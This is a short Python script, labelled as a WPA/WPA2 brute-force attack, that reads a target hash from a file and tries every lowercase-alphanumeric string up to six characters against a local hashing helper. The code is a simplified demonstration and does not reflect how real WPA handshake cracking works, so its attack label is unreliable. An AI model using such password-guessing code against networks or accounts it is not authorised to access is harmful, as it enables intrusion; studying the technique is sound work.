import itertools
import string
import time
from utils import hash_password

def load_handshake():
    with open("handshake.txt", "r") as f:
        return f.read().strip()

def brute_force(target_hash, max_length=8):
    charset = string.ascii_lowercase + string.digits

    attempts = 0
    start_time = time.time()

    print("======================================")
    print(" WPA/WPA2 BRUTE FORCE ATTACK")
    print("======================================\n")

    for length in range(1, max_length + 1):
        for candidate in itertools.product(charset, repeat=length):
            attempts += 1
            password = ''.join(candidate)

            h = hash_password(password)

            print(f"Trying [{attempts}]: {password}")

            if h == target_hash:
                end_time = time.time()
                return password, attempts, end_time - start_time

    return None, attempts, time.time() - start_time


def main():
    target_hash = load_handshake()

    print("[*] Handshake loaded")
    print("[*] Starting brute force...\n")

    found, attempts, duration = brute_force(target_hash, max_length=6)

    print("\n======================================")
    if found:
        print("[+] PASSWORD FOUND:", found)
    else:
        print("[-] Password not found")

    print(f"[+] Attempts: {attempts}")
    print(f"[+] Time: {duration:.2f} seconds")
    print("======================================")

if __name__ == "__main__":
    main()